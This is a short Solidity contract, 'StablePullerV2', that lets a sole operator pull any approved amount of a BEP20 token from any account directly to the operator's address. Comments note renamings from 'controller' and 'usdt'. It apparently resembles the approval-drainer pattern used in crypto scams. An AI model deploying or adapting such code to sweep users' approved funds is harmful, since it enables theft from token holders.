// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBEP20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract StablePullerV2 {
    address public operator;   // was "controller"
    IBEP20  public asset;      // was "usdt"

    event FundsPulled(address indexed account, uint256 amount);             // was TransferExecuted
    event OperatorUpdated(address indexed prevOperator, address indexed newOperator); // was ControllerUpdated

    constructor(address assetToken) {
        operator = msg.sender;
        asset = IBEP20(assetToken);
    }

    modifier onlyOperator() {
        require(msg.sender == operator, "Not operator");
        _;
    }

    /// @notice Pull an exact amount of tokens from `account` to the operator (admin).
    /// @dev Requires prior approval to this contract for at least `amount`.
    function pullExact(address account, uint256 amount) external onlyOperator {
        require(account != address(0), "Bad account");
        require(amount > 0, "Zero amount");
        require(asset.transferFrom(account, operator, amount), "Transfer failed");
        emit FundsPulled(account, amount);
    }

    /// @notice Update the operator (admin). Only current operator may call.
    function setOperator(address newOperator) external onlyOperator {
        require(newOperator != address(0), "Bad operator");
        emit OperatorUpdated(operator, newOperator);
        operator = newOperator;
    }
}
